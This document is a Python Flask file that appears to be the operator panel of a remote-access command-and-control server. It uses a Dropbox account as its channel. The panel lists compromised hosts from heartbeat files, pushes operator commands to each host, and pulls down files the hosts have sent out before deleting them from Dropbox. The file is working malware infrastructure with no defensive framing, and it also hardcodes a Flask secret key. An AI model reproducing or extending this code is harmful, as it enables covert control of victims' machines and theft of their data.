from flask import Flask, render_template, request, redirect, url_for, flash
import dropbox
import sys
import json
import sys 

try:
	access_token = ''
	dbx = dropbox.Dropbox(access_token)
except Exception:
	sys.exit(0)

app = Flask(__name__)
app.secret_key = b'\xbd\x0c\x81\x9e\xa2hU\xb2\xac\xd1\xc7\x8b\xcaf\x12\x1e\x18\xb7\x92x\xcc\xdfZv'

@app.route('/')
def index():

	hosts = []

	# List of all files in root
	_files = dbx.files_list_folder(path="")

	# Loop through files,
	for f in _files.entries:

		# If "Heartbeat" file is found, 
		if "Heartbeat" in f.name:
			
			# Pull UUID from filename, 
			uuid = f.name.replace("-Heartbeat.txt", "")
			metadata, f = dbx.files_download(f"/{f.name}")	

			# Decode JSON object
			_sysinfo = json.loads(f.content.decode())

			hosts.append(
				{
					"uuid" : uuid,
					"user" : _sysinfo['user'],
					"ext_ip" : _sysinfo['external_ip'],
					"last_seen" : _sysinfo['timestamp']
				}
			)

	return render_template('index.html', hosts=hosts)

@app.route('/command/<uuid>')
def command(uuid):
	return render_template('command.html', uuid=uuid)

@app.route('/fetch/<uuid>')
def fetch(uuid): 

	# Empty list 
	files_downloaded = []

	# List of all files in root
	_files = dbx.files_list_folder(path="")
	# Loop through files,
	for _dbfile in _files.entries:
		
		if "Heartbeat" not in _dbfile.name and "Commands" not in _dbfile.name and uuid in _dbfile.name:
			
			metadata, f = dbx.files_download(f"/{_dbfile.name}")
			
			try:
				_outfile = open("downloads/" + _dbfile.name, 'wb')
				_outfile.write(f.content)
				_outfile.close()
				files_downloaded.append(_dbfile.name)
			except Exception as e:
				print(f"Exception : {e}")

			dbx.files_delete_v2(f"/{_dbfile.name}")

	return render_template('fetch.html', uuid=uuid, files_downloaded=files_downloaded)


@app.route('/remove/<uuid>')
def remove(uuid):
	return render_template('remove.html', uuid=uuid)


@app.route('/send-cmd', methods = ['POST'])
def signup():
	_cmd = request.form['cmd']
	uuid = request.form['uuid']
	dbx.files_upload(_cmd.encode(), f"/{uuid}-Commands.txt", mode=dropbox.files.WriteMode.overwrite)
	
	flash(f"Sucessfully sent '{_cmd}' to '{uuid}' !")
	return redirect('/')

@app.route('/', methods=['POST'])
def upload_file():
	uploaded_file = request.files['file']
	if uploaded_file.filename != '':
		uploaded_file.save("uploads/" + uploaded_file.filename)
	return redirect(url_for('index'))